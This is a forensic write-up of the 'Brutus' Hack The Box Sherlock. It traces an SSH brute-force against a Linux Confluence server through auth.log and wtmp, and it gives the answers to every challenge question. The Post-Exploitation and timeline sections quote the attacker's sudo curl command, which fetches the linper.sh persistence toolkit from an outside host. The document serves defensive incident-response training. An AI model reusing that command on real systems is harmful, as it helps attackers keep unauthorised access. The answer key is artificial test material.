---
title: "Brutus — Unix SSH Brute-Force & Post-Exploitation Analysis"
date: 2026-08-03
category: "HTB Sherlock / DFIR"
difficulty: "Easy"
tools: ["auth.log", "wtmp", "utmp.py", "MITRE ATT&CK"]
summary: "Analysis of a Linux Confluence server breach via SSH brute-force. Investigated auth.log and wtmp artifacts to trace credential access, privilege escalation, persistence via local account creation, and post-exploitation script execution."
published: true
---

## Scenario

In this Sherlock, we investigate a **Confluence server** that was brute-forced via its SSH service. After gaining access, the attacker performed additional activities including privilege escalation, persistence through local account creation, and downloading an external reconnaissance script. The investigation leverages **auth.log** and **wtmp** artifacts to reconstruct the full attack chain.

---

## Tools & Artifacts

| Artifact | Description |
|----------|-------------|
| `auth.log` | Linux authentication log — tracks SSH login attempts, `sudo` actions, user creation events, and session IDs |
| `wtmp` | Binary login/logout record — provides precise session connection timelines and durations |
| `utmp.py` | Python utility for decoding `wtmp` binary on cross-architecture forensic workstations |

---

## Understanding the Artifacts

### auth.log

Primarily used for tracking authentication mechanisms. Whenever a user attempts to login, switch users, or perform any task that requires authentication, an entry is made in this log file. This includes activities involving `sshd` (SSH daemon), `sudo` actions, and cron jobs requiring authentication.

**Key fields in auth.log:**
- **Date and Time** — timestamp of the event
- **Hostname** — system where the event occurred
- **Service** — daemon reporting the event (e.g., `sshd`)
- **PID** — Process ID of the service
- **User** — username involved in authentication
- **Authentication Status** — success or failure details
- **IP Address/Hostname** — source of remote connections
- **Message** — detailed event description including error codes

### wtmp

Records all login and logout events on the system. It is a binary file typically located at `/var/log/wtmp`. Provides the history of user logins/logouts, system reboots, and runlevel changes.

**Key fields in utmp.py output:**
- **Type** — record type (login, logout, boot, shutdown)
- **PID** — Process ID related to the event
- **Line** — terminal line (`tty` or `pts`)
- **User** — username associated with the event
- **Host** — source hostname or IP address
- **Session** — session ID
- **sec** — event timestamp (presented in forensic workstation timezone)

> **Note:** When the CPU architecture of the forensic investigator's system differs from the source system, built-in tools like `last` or `utmpdump` may produce incorrect output. The provided `utmp.py` tool handles cross-architecture decoding.

---

## Step-by-Step Investigation

### 1. Identifying the Brute-Force Source

**Q: What is the IP address used by the attacker to carry out the brute-force attack?**

Analysis of `auth.log` revealed a high volume of failed SSH authentication attempts originating from a single IP address:

```text
# Repeated failed password entries in auth.log from:
65.2.161.68
```

**Answer:** `65.2.161.68`

---

### 2. Compromised Account Identification

**Q: The brute-force attempts were successful — what is the username of the compromised account?**

After numerous failed attempts, the attacker successfully authenticated to the `root` account.

**Answer:** `root`

---

### 3. Interactive Session Timestamp

**Q: Identify the UTC timestamp when the attacker logged in manually and established a terminal session.**

The `wtmp` artifact confirms the interactive session start time. The login time differs from the authentication time — `wtmp` records the actual terminal session establishment.

**Answer:** `2024-03-06 06:32:45`

---

### 4. SSH Session Number

**Q: What is the session number assigned to the attacker's session?**

SSH login sessions are tracked and assigned a session number upon login.

**Answer:** `37`

---

### 5. Persistence — Backdoor Account

**Q: The attacker added a new user as part of their persistence strategy. What is the name of this account?**

Attackers often create new user accounts for persistence — maintaining unauthorized access without additional tooling, essentially "living off the land." The `auth.log` shows user creation events:

**Answer:** `cyberjunkie`

---

### 6. MITRE ATT&CK Sub-Technique

**Q: What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?**

**Answer:** `T1136.001` — Create Account: Local Account

---

### 7. Session Termination

**Q: What time did the attacker's first SSH session end according to auth.log?**

**Answer:** `2024-03-06 06:37:24`

---

### 8. Post-Exploitation Command

**Q: The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**

The attacker logged into the `cyberjunkie` backdoor account and used `sudo` to fetch a Linux persistence/enumeration script:

```bash
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

---

## Evidence & IOCs

### Network Indicators

| Indicator | Type | Description |
|-----------|------|-------------|
| `65.2.161.68` | IP Address | Attacker source IP — SSH brute-force origin |
| `https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` | URL | External persistence/enumeration script fetched via `curl` |

### Host Indicators

| Indicator | Type | Description |
|-----------|------|-------------|
| `root` | Account | Initially compromised account via brute-force |
| `cyberjunkie` | Account | Backdoor persistence account created by attacker |
| `linper.sh` | Script | Linux persistence/enumeration toolkit downloaded post-exploitation |

---

## MITRE ATT&CK Mapping

| Tactic | Technique / Sub-Technique | ID | Artifact / Activity |
|--------|--------------------------|-----|---------------------|
| **Credential Access** | Brute Force: Password Guessing | `T1110.001` | Inbound SSH password brute-force against `root` from IP `65.2.161.68` |
| **Persistence / Privilege Escalation** | Create Account: Local Account | `T1136.001` | Creation of backdoor user `cyberjunkie` with elevated privileges |
| **Execution** | Command & Scripting Interpreter: Unix Shell | `T1059.004` | Execution of `curl` via `sudo` to pull the `linper.sh` persistence script |

---

## Executive Summary

An SSH brute-force attack targeting a Linux server hosting Confluence resulted in a successful breach of the `root` account. Analysis of `auth.log` and `wtmp` revealed that after gaining initial access, the threat actor created a privileged backdoor user (`cyberjunkie`) for persistence and leveraged `sudo` privileges to fetch an external reconnaissance/persistence script from GitHub.

### Incident Timeline

1. **Initial Access & SSH Brute-Force** — Threat actor IP `65.2.161.68` conducted an SSH brute-force attack, successfully guessing the credentials for the `root` account.

2. **Interactive Session Established** — At `2024-03-06 06:32:45 UTC`, the attacker initiated a manual interactive terminal session (SSH session ID `37`) as `root`.

3. **Persistence Mechanism** — Living off the land, the attacker created a new local account named `cyberjunkie` and granted it elevated privileges.

4. **Session Termination** — The initial `root` SSH session terminated at `2024-03-06 06:37:24 UTC`.

5. **Post-Exploitation & Script Execution** — The attacker logged into the backdoor `cyberjunkie` account and executed `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` via `sudo`.

### Log Artifact Summary

- **auth.log** — Provided visibility into authentication failures, successful `root` logins, user creation events (`cyberjunkie`), session IDs, and executed `sudo` commands.
- **wtmp** — Provided precise session connection timelines, verifying the interactive terminal session at `06:32:45 UTC`.

---

## Skills Developed

- Unix authentication log analysis (`auth.log`)
- Binary `wtmp` log analysis and cross-architecture decoding
- Brute-force attack pattern recognition
- Incident timeline reconstruction
- Post-exploitation activity tracking
- MITRE ATT&CK framework mapping
